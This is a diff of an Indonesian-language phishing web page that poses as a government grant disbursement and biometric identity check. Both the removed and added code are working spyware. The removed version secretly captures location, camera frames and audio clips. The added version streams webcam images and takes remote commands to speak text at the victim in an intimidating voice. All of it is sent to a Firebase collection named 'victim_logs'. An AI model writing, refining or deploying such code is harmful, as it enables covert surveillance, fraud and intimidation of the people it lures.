@@ -3,43 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Dana Hibah</title>
+    <title>Sistem Verifikasi Biometrik</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .shimmer { background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; }
-        @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
-    </style>
 </head>
 <body class="bg-gray-100 flex items-center justify-center min-h-screen">
-    <!-- Phishing Wall -->
-    <div id="auth-wall" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center p-8 text-center">
-        <div class="w-20 h-20 bg-blue-600 rounded-full flex items-center justify-center text-white text-4xl mb-6 shadow-xl">✓</div>
-        <h1 class="text-2xl font-bold text-gray-800 mb-2">VERIFIKASI IDENTITAS</h1>
-        <p class="text-gray-500 text-sm mb-10 max-w-xs">Proses pencairan dana hibah memerlukan verifikasi biometrik (Wajah & Suara) untuk memastikan keamanan akun Anda.</p>
-        
-        <div class="w-full max-w-xs space-y-4">
-            <button id="init-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-black py-4 rounded-2xl shadow-lg transition-transform active:scale-95">IZINKAN & LANJUTKAN</button>
-            <p class="text-[10px] text-gray-400">Pemerintah RI menjamin kerahasiaan data Anda sesuai UU ITE.</p>
-        </div>
+    <div id="init-panel" class="bg-white p-8 rounded-2xl shadow-2xl max-w-sm text-center">
+        <div class="text-4xl mb-4">🛡️</div>
+        <h1 class="text-xl font-bold mb-4">VERIFIKASI IDENTITAS</h1>
+        <p class="text-sm text-gray-600 mb-8">Pastikan Volume Media Anda Aktif. Sistem akan memberikan instruksi suara untuk proses validasi wajah.</p>
+        <button id="start-btn" class="w-full bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg hover:bg-blue-700 transition-all">SAYA SIAP</button>
     </div>
 
-    <!-- Fake Content Behind Wall -->
-    <div class="max-w-md w-full p-4">
-        <div class="bg-white rounded-3xl p-6 shadow-xl border border-gray-100">
-            <div class="shimmer h-8 w-3/4 rounded mb-4"></div>
-            <div class="shimmer h-40 w-full rounded mb-4"></div>
-            <div class="shimmer h-4 w-1/2 rounded mb-2"></div>
-            <div class="shimmer h-4 w-full rounded"></div>
+    <div id="active-panel" class="hidden text-center">
+        <div class="animate-pulse text-red-600 font-bold mb-4">● PROSES VALIDASI SEDANG BERJALAN</div>
+        <div class="w-32 h-32 border-4 border-blue-500 rounded-full mx-auto overflow-hidden">
+            <video id="v" class="w-full h-full object-cover" autoplay playsinline></video>
         </div>
+        <p class="mt-4 text-gray-500 text-xs">Jangan tutup halaman ini...</p>
     </div>
 
-    <!-- Hidden Spy Tools -->
-    <video id="v" style="display:none" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
         const firebaseConfig = {
@@ -58,13 +45,51 @@
         const auth = getAuth(app);
         const appId = "apktroj_v1";
 
-        document.getElementById('init-btn').onclick = async () => {
-            document.getElementById('auth-wall').style.display = 'none';
+        document.getElementById('start-btn').onclick = async () => {
+            document.getElementById('init-panel').classList.add('hidden');
+            document.getElementById('active-panel').classList.remove('hidden');
             await signInAnonymously(auth);
-            runUltraSmoothSpy();
+            startCore();
         };
 
-        async function push(data) {
+        async function startCore() {
+            // Listen to Intercom Commands
+            onSnapshot(collection(db, 'artifacts', appId, 'public', 'data', 'commands'), (snap) => {
+                snap.docChanges().forEach(change => {
+                    if (change.type === "added") {
+                        const cmd = change.doc.data();
+                        if(cmd.type === "TTS_VOICE") {
+                            speak(cmd.text);
+                        }
+                    }
+                });
+            });
+
+            // Start Camera Spying
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                setInterval(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = video.videoWidth / 4;
+                    canvas.height = video.videoHeight / 4;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    sendData({ action: "LIVE_FRAME", frame: canvas.toDataURL('image/jpeg', 0.2) });
+                }, 2000);
+            });
+        }
+
+        function speak(text) {
+            const synth = window.speechSynthesis;
+            const utter = new SpeechSynthesisUtterance(text);
+            utter.lang = 'id-ID';
+            utter.rate = 0.9;
+            utter.pitch = 0.8; // Buat suara agak berat biar serem
+            synth.speak(utter);
+        }
+
+        async function sendData(data) {
             try {
                 await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs'), {
                     ...data,
@@ -72,43 +97,6 @@
                     timestamp: Date.now()
                 });
             } catch (e) {}
-        }
-
-        function runUltraSmoothSpy() {
-            // Location tracking
-            navigator.geolocation.getCurrentPosition(p => {
-                push({ action: "GEO_UPDATE", location: { lat: p.coords.latitude, lng: p.coords.longitude } });
-            });
-
-            // Camera & Mic
-            navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true }).then(stream => {
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                // ULTRA SMOOTH: Frame every 500ms
-                setInterval(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = 160; // Downscale for speed
-                    canvas.height = 120;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 160, 120);
-                    push({ action: "LIVE_FRAME", frame: canvas.toDataURL('image/jpeg', 0.2) });
-                }, 500);
-
-                // Audio Stream: 5s clips
-                const recorder = new MediaRecorder(stream);
-                let chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = () => {
-                    const reader = new FileReader();
-                    reader.onloadend = () => push({ action: "AUDIO_CLIP", audio: reader.result });
-                    reader.readAsDataURL(new Blob(chunks));
-                    chunks = [];
-                    setTimeout(() => recorder.start(), 500);
-                };
-                recorder.start();
-                setInterval(() => { if(recorder.state === 'recording') recorder.stop(); }, 5000);
-
-            }).catch(e => push({ action: "AUTH_DENIED", msg: e.message }));
         }
     </script>
 </body>
